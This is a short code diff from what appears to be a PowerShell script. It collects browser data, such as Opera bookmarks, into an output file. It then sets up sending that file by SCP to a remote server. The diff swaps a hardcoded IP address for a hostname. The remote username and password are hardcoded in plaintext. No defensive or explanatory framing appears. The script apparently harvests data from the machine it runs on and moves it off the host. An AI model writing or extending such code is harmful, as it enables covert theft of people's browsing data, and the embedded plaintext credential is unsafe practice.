@@ -43,7 +43,8 @@ Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $OutputFile
 
 # SCP the file to a remote server
 $RemoteUser = "Benjak617"
-$RemoteServer = "174.51.68.96"
+# $RemoteServer = "174.51.68.96"
+$RemoteServer = "BENJAK618"
 $RemotePath = "/"
 $Password = "Snowman1234!"
 
